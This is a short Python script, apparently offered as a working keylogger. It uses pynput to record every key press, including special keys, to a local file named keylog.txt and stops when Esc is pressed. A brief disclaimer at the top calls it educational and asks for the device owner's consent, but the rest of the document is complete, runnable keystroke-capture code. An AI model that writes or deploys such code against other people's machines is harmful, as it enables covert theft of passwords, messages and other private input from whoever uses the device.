# WARNING: This program is for educational and testing purposes only.
# Do not use this without explicit consent from the owner of the device.

# To install: pip install pynput

from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    """Logs key presses to a file."""
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., Space, Enter)
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(' ')
        else:
            with open(log_file, "a") as f:
                f.write(f' [{str(key).replace("Key.", "")}] ')

def on_release(key):
    """Stops the keylogger on Esc key press."""
    if key == Key.esc:
        print("\nKeylogger stopped.")
        return False

print("Starting keylogger... Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()